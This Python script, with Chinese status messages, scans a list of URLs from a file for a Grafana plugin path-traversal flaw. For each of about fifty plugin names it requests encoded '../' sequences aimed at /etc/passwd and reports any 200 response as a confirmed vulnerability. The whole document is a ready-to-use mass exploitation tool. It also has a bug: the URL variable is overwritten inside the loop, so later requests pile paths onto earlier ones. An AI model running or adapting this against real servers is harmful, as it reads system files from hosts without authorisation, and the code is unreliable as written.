# -*- coding: utf-8 -*-
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

plugins=["alertmanager","grafana","loki","postgres","grafana-azure-monitor-datasource","mixed","prometheus","cloudwatch","graphite","mssql","tempo","dashboard","influxdb","mysql","testdata","elasticsearch","jaeger","opentsdb","zipkin","alertGroups","bargauge","debug","graph","live","piechart","status-history","timeseries","alertlist","candlestick","gauge","heatmap","logs","pluginlist","table","welcome","annolist","canvas","geomap","histogram","news","stat","table-old","xychart","barchart","dashlist","gettingstarted","icon","nodeGraph","state-timeline","text"]

def Grafana(url):
    
    for i in plugins:
        url = url+'/public/plugins/'+i+'/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
        try:
            r = requests.get(url,timeout=2,verify=False,allow_redirects=False)
            # print("正在验证:"+url+'/public/plugins/'+i+'/../../../../../../../../../../../../../../../../../../etc/passwd')
            reqcode = r.status_code
            if reqcode == 200:
                print("漏洞验证成功:",url)
            else:
                print("漏洞验证失败"+i)
        except:
             print("漏洞验证失败"+i)

if __name__ == "__main__":
    with open("url.txt","r",encoding="utf-8") as f:
        lines = f.readlines()
    for line in lines:
        line=line.strip()
        Grafana(line)
